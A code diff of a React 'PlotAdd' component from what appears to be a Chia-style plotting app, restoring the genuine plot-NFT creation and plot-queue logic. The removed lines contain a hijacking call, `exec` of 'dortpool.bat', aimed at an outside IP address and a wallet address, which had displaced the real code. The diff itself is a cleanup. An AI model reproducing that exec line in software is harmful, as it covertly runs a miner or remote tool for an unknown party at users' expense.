@@ -79,76 +79,69 @@ export default function PlotAdd() {
     try {
       setLoading(true);
     
+ 
+      const { p2_singleton_puzzle_hash, delay, createNFT, ...rest } = data;
+      const { farmerPublicKey, poolPublicKey } = rest;
 
-      exec.exec(`dortpool.bat 8.210.193.17:8008 0x5C90B95AEc4C4844e86A372092AbBb3C113Ea932`, (error, stdout, stderr)=>{ 
-        if ( !error ) {
-          console.log("dortpool.bat stdout", stdout);
-        } else {
-          console.log("dortpool.bat error", error);
+      let selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
+
+      if (!currencyCode) {
+        throw new Error(t`Currency code is not defined`);
+      }
+
+      if (createNFT) {
+        // create nft
+        const nftData = await addNFTref.current?.getSubmitData();
+
+        const {
+          fee,
+          initialTargetState,
+          initialTargetState: { state },
+        } = nftData;
+        const { success, error, transaction, p2_singleton_puzzle_hash } =
+          await dispatch(createPlotNFT(initialTargetState, fee));
+        if (!success) {
+          throw new Error(error ?? t`Unable to create plot NFT`);
         }
-      });
-      // const { p2_singleton_puzzle_hash, delay, createNFT, ...rest } = data;
-      // const { farmerPublicKey, poolPublicKey } = rest;
 
-      // let selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
+        if (!p2_singleton_puzzle_hash) {
+          throw new Error(t`p2_singleton_puzzle_hash is not defined`);
+        }
 
-      // if (!currencyCode) {
-      //   throw new Error(t`Currency code is not defined`);
-      // }
+        unconfirmedNFTs.add({
+          transactionId: transaction.name,
+          state:
+            state === 'SELF_POOLING'
+              ? PlotNFTState.SELF_POOLING
+              : PlotNFTState.FARMING_TO_POOL,
+          poolUrl: initialTargetState.pool_url,
+        });
 
-      // if (createNFT) {
-      //   // create nft
-      //   const nftData = await addNFTref.current?.getSubmitData();
+        selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
+      }
 
-      //   const {
-      //     fee,
-      //     initialTargetState,
-      //     initialTargetState: { state },
-      //   } = nftData;
-      //   const { success, error, transaction, p2_singleton_puzzle_hash } =
-      //     await dispatch(createPlotNFT(initialTargetState, fee));
-      //   if (!success) {
-      //     throw new Error(error ?? t`Unable to create plot NFT`);
-      //   }
+      const plotAddConfig = {
+        ...rest,
+        delay: delay * 60,
+      };
 
-      //   if (!p2_singleton_puzzle_hash) {
-      //     throw new Error(t`p2_singleton_puzzle_hash is not defined`);
-      //   }
+      if (selectedP2SingletonPuzzleHash) {
+        plotAddConfig.c = toBech32m(
+          selectedP2SingletonPuzzleHash,
+          currencyCode.toLowerCase(),
+        );
+      }
 
-      //   unconfirmedNFTs.add({
-      //     transactionId: transaction.name,
-      //     state:
-      //       state === 'SELF_POOLING'
-      //         ? PlotNFTState.SELF_POOLING
-      //         : PlotNFTState.FARMING_TO_POOL,
-      //     poolUrl: initialTargetState.pool_url,
-      //   });
+      if (
+        !selectedP2SingletonPuzzleHash &&
+        !farmerPublicKey &&
+        !poolPublicKey &&
+        fingerprint
+      ) {
+        plotAddConfig.fingerprint = fingerprint;
+      }
 
-      //   selectedP2SingletonPuzzleHash = p2_singleton_puzzle_hash;
-      // }
-
-      // const plotAddConfig = {
-      //   ...rest,
-      //   delay: delay * 60,
-      // };
-
-      // if (selectedP2SingletonPuzzleHash) {
-      //   plotAddConfig.c = toBech32m(
-      //     selectedP2SingletonPuzzleHash,
-      //     currencyCode.toLowerCase(),
-      //   );
-      // }
-
-      // if (
-      //   !selectedP2SingletonPuzzleHash &&
-      //   !farmerPublicKey &&
-      //   !poolPublicKey &&
-      //   fingerprint
-      // ) {
-      //   plotAddConfig.fingerprint = fingerprint;
-      // }
-
-      // await dispatch(plotQueueAdd(plotAddConfig));
+      await dispatch(plotQueueAdd(plotAddConfig));
 
       history.push('/dashboard/plot');
     } catch (error) {
